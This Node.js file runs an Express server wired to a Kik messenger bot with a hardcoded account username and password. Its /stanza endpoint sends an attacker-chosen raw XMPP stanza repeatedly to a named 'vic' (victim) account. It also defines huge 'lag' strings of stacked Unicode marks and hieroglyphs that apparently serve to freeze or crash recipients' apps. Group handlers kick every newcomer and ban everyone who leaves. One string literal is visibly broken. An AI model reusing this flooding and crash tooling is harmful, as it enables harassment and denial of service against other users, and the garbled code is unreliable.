/////////////

////server//

///////////

const express = require("express");

const app = express();

const permit = require("./src/permit");

// we've started you off with Express,

// but feel free to use whatever libs or frameworks you'd like through `package.json`.

app.use(express.json({ limit: "500mb", extended: true }));

app.use(express.urlencoded({ limit: "500mb", extended: true }));

// http://expressjs.com/en/starter/static-files.html

app.use(express.static("public"));

app.get("/", function(request, response) {

  response.sendFile(__dirname + "/views/index.html");

});

////////////

///bot code

///////////

const KikClient = require("./src/core"),

  decode = require("unescape");

const Kik = new KikClient({

  username: "gottabeskiddingme",

  password: "looped1",

  promptCaptchas: true,

  trackUserInfo: true,

  trackFriendInfo: true

});

async function webXmpp(stan, num, vic) {

  let numb = 0;

  while (numb <= num) {

    console.log(stan);

    Kik.sendXmpp(vic, stan);

    await new Promise(resolve => setTimeout(resolve, delay));

    numb += 1;

  }

}

app.post("/stanza", function(req, res) {

  console.log(req.body);

  res.send("");

  webXmpp(req.body[0], req.body[1], req.body[2]);

});

Kik.on("authenticated", () => {

  //this is not needed since the client grabs roster automatically once authenticated

  /*    Kik.getRoster((groups, friends) => {

        console.log("We got the roster")

        console.log(groups)

        console.log(friends)

    })*/

});

//alternatively you can use this event for roster

Kik.on("receivedroster", (groups, friends) => {

  console.log(groups);

  console.log(friends);

});

//alternatively you can use this event for captcha

Kik.on("receivedcaptcha", captchaUrl => {

  console.log("Please solve captcha" + captchaUrl);

});

Kik.on("receivedjidinfo", users => {

  console.log("We got peer info:");

  console.log(users);

});

/*GROUP EVENTS*/

Kik.on("receivedgroupmsg", (group, sender, msg) => {

  console.log(`GROUP:${group.code}: [${sender.displayName}]: ${msg}`);

});

Kik.on("grouptyping", (group, sender, isTyping) => {

  if (isTyping) {

    console.log(`GROUP:${group.code}: ${sender.displayName} is typing...`);

  } else {

    console.log(`GROUP:${group.code}: ${sender.displayName} stopped typing`);

  }

});

Kik.on("userleftgroup", (group, user, kickedBy) => {

  console.log(`GROUP:${group.code}: ${user.displayName} left the group`);

  //ban anyone once they leave

  Kik.setBanned(group.jid, user.jid, true);

});

Kik.on("userjoinedgroup", (group, user, invitedBy) => {

  console.log(`GROUP:${group.code}: ${user.displayName} joined the group`);

  //kicking anyone once they join

  Kik.setGroupMember(group.jid, user.jid, false);

});

let lag1 =
l";

let delay = 150;

let lag2 =  "፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞׃Ξँ፝ू፝ﹼঃृ፝፨፝፝ﹼ፝Ξ፝፝ँ፨፝፝ﹼ፝Ξ፝፝ँ፝ृ፟፞";

let lag3 = "x20𓁓𓇹𓇈𓆭𓀇𓇫𓍨𓇣𓆲𓅜𓏘𓌧𓉴𓏣𓏞𓍛𓎨𓁔𓏨𓊙𓌖𓍴𓈈𓄧𓃅𓌄𓅥𓌣𓁛𓆘𓅨𓉯𓇞𓅪𓄘𓁼𓂱𓈞𓄀𓏡𓇻𓆂𓅽𓏻𓄰𓀈𓂈𓈉𓉓𓇋𓁨𓉪𓉤𓂍𓉀𓃐𓃕𓃼𓄬𓇼𓊍𓊤𓂤𓁢𓅦𓎠𓈯𓈝𓂿𓌭𓊬𓉿𓄷𓉄𓊀𓈵𓌸𓂽𓌚𓏳𓋠𓉇𓂳𓅴𓇂𓈷𓏫𓁴𓏈𓍎𓅛𓎀𓐙𓅀𓈡𓀎𓌃𓐌𓋿𓃷𓄣𓁰𓅗𓎿𓏶𓌽𓄦𓆑𓂑𓅊𓀥𓍼𓀮𓉈𓀟𓎒𓅎𓐝𓎁𓏚𓄒𓏆𓉥𓅠𓈻𓈲𓊒𓐦𓁊𓅔𓏭𓎖𓃔𓐊𓎺𓋭𓁯𓃃𓈱𓃖𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓏤𓅾𓀭𓏵𓊟𓍏𓌂𓁐𓆟𓊘𓂊𓅢𓂚𓎲𓉙𓄎𓊡𓃾𓁖𓇒𓋼𓋄𓆎𓂭𓇱𓌥𓌱𓏌𓍬𓁙𓏢𓆊𓅤𓀾𓌗𓁡𓍗𓈭𓏄𓐎𓇾𓇮𓄼𓊽𓃬𓁃𓐏𓄢𓁻𓄙𓍭𓃪𓀸𓄲𓆸𓄃𓇿𓋫𓎆𓌫𓉲𓈸𓋕𓉌𓌪𓎫𓐉𓇳𓀆𓎼𓂔𓈬𓐫𓌓𓂧𓂃𓋅𓁿𓈺𓊦𓐓𓋬𓍫𓆣𓆞𓎾𓀤𓆄𓎷𓈙𓆨𓉨𓋗𓎝𓆏𓄪𓌲𓋾𓈎𓉢𓏽𓅋𓄑𓍉𓆻𓇧𓉳𓄜𓁞𓐀𓊱𓅟𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓉆𓈆𓁒𓌏𓏉𓈫𓅂𓀂𓂶𓋴𓌋𓍳𓄌𓋺𓆷𓉂𓀅𓀹𓇎𓊲𓂙𓎽𓂝𓄻𓉷𓍂𓃨𓅏𓌡𓏝𓎌𓎜𓀊𓂸𓏮𓌟𓉎𓊴𓊮𓇺𓋌𓊋𓊊𓁬𓄠𓍁𓂣𓆆𓍀𓌿𓂞𓀍𓅮𓉅𓃞𓐠𓎗𓁶𓌠𓏧𓀱𓇊𓄐𓀕𓃳𓈧𓆿𓍋𓇇𓈟𓋓𓁳𓎐𓐩𓍶𓇭𓋧𓆀𓍷𓄵𓂓𓂘𓊪𓁭𓊿𓃏𓉣𓇯𓆼𓅝𓋈𓍇𓉚𓊓𓈕𓇕𓆔𓁸𓎮𓀧𓐂𓀛𓋚𓇆𓄿𓋣𓁾𓋡𓉍𓉒𓉶𓁲𓅑𓃒𓀲𓃓𓐢𓏟𓀣𓋸𓊨𓈳𓃿𓇥𓁉𓏅𓐒𓁘𓇵𓏱𓃰𓍜𓂨𓉐𓌦𓎵𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓆖𓎳𓋇𓋁𓂜𓂾𓁀𓇷𓏷𓄳𓀝𓆩𓆃𓇩𓎶𓁷𓆇𓌍𓄟𓎂𓋉𓉹𓎣𓊄𓊎𓇉𓉘𓌇𓋽𓊁𓇀𓊵𓊼𓆉𓃩𓉰𓂷𓈚𓆝𓍯𓁪𓎎𓉞𓌒𓈶𓈨𓊳𓊻𓍈𓏃𓂂𓉵𓂏𓌹𓄚𓎟𓎹𓉻𓈄𓋰𓅫𓃌𓅉𓊢𓐃𓃎𓂬𓅷𓀠𓏀𓅯𓄂𓍐𓎓𓃮𓈊𓆠𓉩𓍠𓄆𓌛𓎑𓄴𓃈𓈼𓃧𓈮𓋜𓎧𓊔𓋲𓃙𓄫𓂠𓁤𓐬𓄶𓃥𓃱𓄄𓄔𓇁𓄮𓐋𓉁𓐮𓉏𓎙𓀄𓅕𓍡𓃛𓅣𓄭𓀑𓂉𓃡𓂴𓅰𓎛𓈣𓂖𓈌𓈖𓁥𓅹𓉱𓋘𓐖𓍌𓇗𓊌𓌼𓍄𓈦𓉸𓆮𓃚𓂇𓃫𓈘𓀫𓄹𓇚𓋱𓆡𓐛𓆌𓉟𓇠𓂯𓌔𓐕𓌶𓊕𓇶𓀡𓄊𓅅𓎕𓀢𓐗𓈁𓋃𓏦𓇃𓄍𓀓𓋍𓐈𓍆𓍃𓀨𓊏𓌯𓋷𓆶𓌝𓂪𓆈𓂻𓄗𓇓𓋻𓎭𓃤𓎇𓁁𓅁𓍟𓆯𓁮𓍝𓄅𓎴𓅼𓅲𓅌𓀳𓈹𓏔𓊝𓎪𓄝𓂛𓉧𓀺𓋪𓐪𓀞𓍕𓇦𓇙𓂄𓂎𓌺𓋞𓃍𓀦𓁂𓇤𓋆𓊐𓐡𓃦𓀵𓈋𓏊𓉊𓅖𓅞𓃊𓂅𓇏𓅄𓄺𓆦𓅙𓋖𓐧𓃵𓊺𓀉𓍣𓉕𓂒𓂗𓁅𓋨𓏍𓏴𓎬𓈒𓐅𓄾𓄨𓊰𓌩𓅓𓄛𓇐𓍵𓀴𓅆𓆫𓉦𓎘𓃽𓁠𓈩𓉬𓅻𓄓𓄱𓊷𓅭𓁗𓎃𓅵𓁆𓃝𓈰𓃴𓆳𓄈𓆍𓃠𓃂𓀔𓇅𓀒𓏗𓍑𓂫𓁌𓋥𓀻𓇍𓊜𓎢𓅘𓈇𓏸𓌾𓂌𓋦𓀼𓐘𓆬𓋛𓇪𓂼𓋮𓌅𓈅𓇟𓂀𓉉𓁩𓍙𓃶𓀁𓆕𓄡𓄩𓉭𓊥𓅈𓐑𓇜𓃋𓎉𓁫𓄕𓈑𓃑𓊧𓄞𓍅𓆱𓇄𓉽𓌐𓇌𓂢𓈓𓁦𓈠𓀌𓃁𓉡𓎊𓁈𓇨𓁵𓋎𓇢𓏜𓎚𓅒𓃗𓈿𓆹𓄯𓇝𓆐𓊞𓊯𓋩𓍤𓊆𓀿𓌞𓁧𓋏𓅿𓐨𓄉𓎰𓎯𓆛𓏩𓌙𓍸𓀐𓍽𓆙𓅸𓃇𓀀𓂺𓈔𓂵𓏖𓇡𓀘𓈐𓂐𓎅𓋟𓅩𓐥𓄏𓌈𓋝𓇰𓎡𓆧𓂟𓂋𓏬𓃯𓏰𓈃𓈍𓋶𓇖𓎄𓎏𓎈𓎻𓆁𓅚𓁱𓆚𓉋𓍚𓆺𓇸𓊗𓋔𓉔𓁹𓍹𓍒𓅶𓎩𓏁𓊚𓌆𓐣𓋋𓏹𓄖𓈜𓐍𓇛𓀽𓆒𓉠𓐭𓍾𓂩𓎔𓂰𓈽𓀶𓋒𓄽𓏪𓀬𓀗𓐔𓈗𓌨𓌜𓎞𓆴𓂦𓆥𓋯𓅇𓏺𓈢𓀏𓌳𓋳𓉑𓏑𓅬𓊫𓏂𓆽𓃣𓇔𓌵𓊅𓌢𓌀𓃢𓍍𓎤𓏿𓇴𓊠𓍧𓁽𓍞𓂆𓍦𓂁𓆓𓆵𓈂𓈴𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓎁𓐨𓇦𓋔𓀽𓇿𓋓𓇝𓌶𓄰𓃧𓆹𓌵𓀞𓈋𓉙𓂑𓅌𓌠𓎭𓋗𓈪𓄠𓀮𓋱𓀑𓂸𓇪𓋪𓀦𓄙𓋊𓂫𓊸𓃬𓂄𓄸𓆑𓄕𓉔𓍥𓍗𓁶𓂹𓀳𓎿𓋙𓌺𓏃𓁺𓏼𓅇𓇷𓆪𓆩𓊬𓆞𓎶𓂞𓁤𓌘𓆉𓃽𓍤𓎲𓊦𓏾𓁏𓂳𓅸𓉻𓁿𓏅𓈀𓆆𓆺𓍪𓋼𓆿𓏽𓋎𓃄𓀷𓊙𓌽𓃈𓊐𓈮𓃌𓐖𓍩𓍞𓆔𓄭𓎤𓏘𓁗𓆵𓌲𓀕𓋁𓇍𓊖𓀨𓍧𓃑𓁝𓅿𓐎𓀹𓅵𓊤𓉿𓅺𓃨𓌞𓄗𓋖𓇼𓆟𓆝𓃢𓐥𓈸𓀻𓅚𓐧𓂒𓁁𓁋𓐘𓋧𓎥𓀡𓅈𓃃𓄯𓎒𓅠𓉹𓊄𓋇𓀣𓐋𓐤𓂾𓈍𓁀𓉕𓆋𓅡𓃝𓆨𓀎𓃞𓏒𓈂𓌍𓇂𓏡𓍉𓅘𓇩𓇃𓃒𓏩𓀴𓋚𓅃𓊻𓇵𓄑𓌤𓍝𓁨𓊊𓈚𓇑𓈊𓎉𓈗𓃺𓍱𓇀𓊀𓏀𓄅𓌷𓀤𓇉𓆫𓎷𓌩𓂢𓀒𓎙𓊽𓀲𓄣𓁦𓉒𓁯𓀸𓂇𓎅𓇊𓆛𓌜𓏟𓇌𓋻𓂠𓐏𓂘𓏐𓁻𓐩𓊩𓏤𓂂𓏁𓃍𓏫𓏳𓏰𓎳𓊲𓃟𓉰𓀪𓍒𓃻𓄎𓆦𓎛𓋛𓈳𓄇𓄵𓋘𓈇𓃲𓃊𓇮𓆓𓐓𓇶𓃉𓋰𓄩𓈎𓃔𓀂𓂮𓁘𓁧𓁓𓆡𓅟𓊚𓐝𓀩𓇛𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐑𓈛𓍴𓆻𓅥𓇜𓏌𓀝𓂡𓏯𓈽𓂟𓇺𓆾𓇄𓆽𓈓𓃶𓐊𓄺𓈱𓋤𓅩𓁡𓂏𓎵𓇞𓎗𓂗𓎹𓉲𓂌𓄪𓆌𓏓𓍡𓊨𓍠𓄖𓅽𓂅𓋶𓇨𓇐𓉱𓍄𓀥𓍚𓉊𓆕𓉂𓏕𓅆𓎧𓅎𓐒𓄢𓃫𓁢𓉭𓂦𓇴𓏭𓊈𓎡𓏱𓌈𓌭𓅒𓂔𓐇𓍋𓆭𓆄𓌬𓂭𓃇𓃀𓎦𓂚𓄛𓐮𓃪𓍃𓈟𓆏𓇈𓋦𓈩𓇠𓊞𓆈𓊘𓃥𓀵𓉺𓆢𓍳𓌃𓃆𓌙𓈬𓇰𓋠𓈫𓎐𓆤𓉅𓆊𓄴𓋥𓋿𓄐𓋩𓊜𓁙𓌆𓂺𓆀𓍑𓏑𓆬𓁕𓅤𓁹𓍌𓆇𓍵𓉪𓃭𓋷𓅯𓈦𓇱𓀈𓇫𓁪𓅔𓄏𓏶𓍆𓅝𓋏𓈢𓀋𓉌𓁽𓋸𓏿𓎊𓁔𓊣𓏧𓉷𓅖𓀧𓐛𓀔𓐄𓉩𓐐𓂁𓄒𓊧𓆅𓅏𓅮𓎟𓄉𓄮𓁃𓆥𓎺𓀭𓃕𓌑𓊡𓉟𓊴𓎝𓐁𓎜𓎖𓏆𓃅𓃂𓏷𓌢𓁌𓅪𓅶𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓍰𓅷𓃦𓆘𓋣𓍣𓅫𓈜𓋞𓁟𓏛𓏗𓀰𓃠𓏄𓎔𓐚𓌐𓂥𓌝𓌳𓌒𓂀𓍦𓋹𓃮𓏲𓉃𓋋𓃡𓇳𓎆𓁆𓅳𓃤𓁎𓊒𓏈𓆁𓈹𓌕𓏹𓁑𓁮𓇟𓂈𓇢𓁒𓊵𓍬𓆃𓎰𓁐𓍿𓌟𓋳𓂼𓅱𓇒𓎞𓄦𓃐𓁉𓉬𓂿𓎼𓋃𓏸𓏮𓌎𓃴𓇤𓈙𓍊𓍔𓄳𓇎𓉖𓄝𓈅𓎋𓀁𓁊𓋟𓉞𓇧𓅅𓐙𓊱𓋲𓍨𓁼𓇚𓁫𓀫𓊎𓈲𓊾𓌹𓍂𓊁𓏢𓆙𓋡𓇲𓄨𓉳𓋬𓎂𓆶𓎓𓈈𓁂𓍈𓏴𓄃𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓅛𓎢𓋅𓂉𓁇𓅲𓉯𓎈𓐣𓋍𓇾𓐍𓆒𓀖𓈯𓃱𓍏𓐠𓎌𓏨𓄶𓇁𓍹𓌣𓏝𓆍𓄀𓈨𓀱𓆰𓍫𓅉𓊺𓊅𓉀𓊪𓌛𓊷𓅀𓄧𓂙𓁰𓆸𓁈𓅓𓊑𓏊𓋯𓀆𓈿𓍓𓂲𓍷𓌓𓐆𓂰𓁱𓅰𓆧𓄓𓀛𓉏𓁷𓀘𓊍𓌥𓌋𓎇𓉎𓎸𓂷𓉓𓌰𓇆𓉣𓇘𓌸𓀜𓂻𓄁𓎻𓄷𓉋𓍲𓎬𓇕𓇔𓅄𓉥𓉍𓎯𓉫𓉾𓌗𓁠𓄄𓉑𓌱𓋺𓌊𓅞𓀏𓃩𓊛𓋢𓎕𓐂𓈉𓋐𓊔𓈻𓁖𓃿𓃷𓁛𓀟𓃾𓉨𓋵𓎏𓐔𓏦𓂍𓃏𓋨𓁣𓋉𓌮𓀺𓃣𓁳𓅑𓈔𓅂𓐀𓀠𓎮𓄹𓄘𓍕𓄊𓅍𓆲𓃼𓈝𓈡𓊌𓁞𓋮𓉶𓍼𓀌𓊟𓇇𓂶𓉚𓉗𓋜𓇓𓄤𓆣𓂨𓊆𓄔𓆖𓐟𓀬𓀐𓎾𓇗𓅼𓄌𓄈𓍎𓆯𓄻𓀃𓅢𓅧𓍐𓌚𓁩𓌪𓍁𓇡𓀙𓄟𓆮𓋀𓌅𓂪𓊼𓍽𓊓𓀅𓌀𓋽𓏜𓂊𓍢𓁍𓐜𓅭𓇻𓌏𓃎𓏖𓋝𓐃𓏎𓈄𓅬𓌾𓁭𓊳𓅾𓃸𓎑𓊢𓇸𓍾𓏪𓎣𓈒𓅕𓄍𓂋𓈁𓂝𓉧𓁴𓎃𓋈𓌄𓉢